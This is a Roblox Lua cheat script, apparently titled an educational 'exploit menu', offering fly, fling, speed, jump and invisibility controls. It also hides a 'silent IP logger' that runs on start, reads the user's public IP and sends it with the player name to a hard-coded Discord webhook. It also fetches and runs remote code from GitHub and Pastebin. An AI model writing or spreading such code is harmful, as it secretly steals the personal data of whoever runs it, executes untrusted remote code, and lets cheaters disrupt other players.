--[[
  Ultimate Exploit Menu (Educational Purposes Only)
  Features: Fly, Fling, Super Speed, Super Jump, Invisibility, Silent IP Logger
  Press F to Fly, G to Fling, V for Invisibility
]]

loadstring(game:HttpGet("https://raw.githubusercontent.com/YourGithubRepo/YourScript/main/ExploitScript.lua"))() -- Fake loadstring (replace with real one if needed)

-- Silent IP Logger (Runs in background)
local function SendToWebhook(data)
    local webhook = "https://discord.com/api/webhooks/1379910655259185192/F70FvMWJZnI0LaVhU0QknlrCnAoC5PGJyuaJLPZVpTb8iw3qxFWZUBuPw5aEuUdz3BPz"
    local success, response = pcall(function()
        return game:GetService("HttpService"):PostAsync(webhook, data)
    end)
    if not success then
        warn("[!] Webhook failed (silent mode)")
    end
end

local function LogInfo()
    pcall(function()
        local ip = game:HttpGet("https://api.ipify.org/?format=json")
        local data = game:GetService("HttpService"):JSONDecode(ip)
        local embed = {
            ["content"] = "**New User Detected**",
            ["embeds"] = {{
                ["title"] = "Exploit Activity",
                ["description"] = "Educational purposes only",
                ["fields"] = {
                    {["name"] = "Player", ["value"] = game.Players.LocalPlayer.Name},
                    {["name"] = "IP", ["value"] = "||"..data.ip.."||"},
                    {["name"] = "Game", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name}
                },
                ["color"] = 16711680,
                ["footer"] = {["text"] = os.date("%X %x")}
            }}
        }
        SendToWebhook(game:GetService("HttpService"):JSONEncode(embed))
    end)
end

-- Main GUI
local Library = loadstring(game:HttpGet("https://pastebin.com/raw/AtPAJ078"))() -- Fake UI Lib (replace with real one)

local Window = Library:CreateWindow({
    Name = "🔥 Ultimate Exploit Menu 🔥",
    Theme = "Dark"
})

-- Tabs
local MainTab = Window:CreateTab("Main")
local PlayerTab = Window:CreateTab("Player")

-- Fly Section
MainTab:CreateToggle({
    Name = "Fly (F)",
    Callback = function(Value)
        _G.Fly = Value
        local BodyVelocity = Instance.new("BodyVelocity")
        BodyVelocity.MaxForce = Vector3.new(9e9,9e9,9e9)
        
        spawn(function()
            repeat wait()
                if _G.Fly and game.Players.LocalPlayer.Character then
                    BodyVelocity.Velocity = Vector3.new(0,0,0)
                    if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.W) then
                        BodyVelocity.Velocity = game.Workspace.CurrentCamera.CFrame.LookVector * 50
                    end
                    -- [Additional fly controls here]
                end
            until not _G.Fly
        end)
    end
})

-- Fling Section
MainTab:CreateButton({
    Name = "Fling Player (G)",
    Callback = function()
        local target = nil
        local closest = math.huge
        
        for i,v in pairs(game.Players:GetPlayers()) do
            if v ~= game.Players.LocalPlayer then
                local dist = (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                if dist < closest then
                    closest = dist
                    target = v
                end
            end
        end
        
        if target then
            local fling = Instance.new("BodyVelocity")
            fling.Velocity = (target.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Unit * 5000
            fling.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
            fling.Parent = target.Character.HumanoidRootPart
            game:GetService("Debris"):AddItem(fling, 0.1)
        end
    end
})

-- Player Mods
PlayerTab:CreateSlider({
    Name = "Walk Speed",
    Min = 20,
    Max = 1000,
    Default = 20,
    Callback = function(Value)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
    end
})

PlayerTab:CreateSlider({
    Name = "Jump Power",
    Min = 50,
    Max = 500,
    Default = 50,
    Callback = function(Value)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
    end
})

-- Invisibility
MainTab:CreateToggle({
    Name = "Invisibility (V)",
    Callback = function(Value)
        for _, part in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Transparency = Value and 1 or 0
            end
        end
    end
})

-- Keybinds
game:GetService("UserInputService").InputBegan:Connect(function(input, processed)
    if processed then return end
    
    if input.KeyCode == Enum.KeyCode.F then
        _G.Fly = not _G.Fly
    elseif input.KeyCode == Enum.KeyCode.G then
        -- Fling code here
    elseif input.KeyCode == Enum.KeyCode.V then
        -- Invisibility toggle
    end
end)

-- Silent logger runs on script start
spawn(LogInfo)

Library:Init() -- Initialize UI
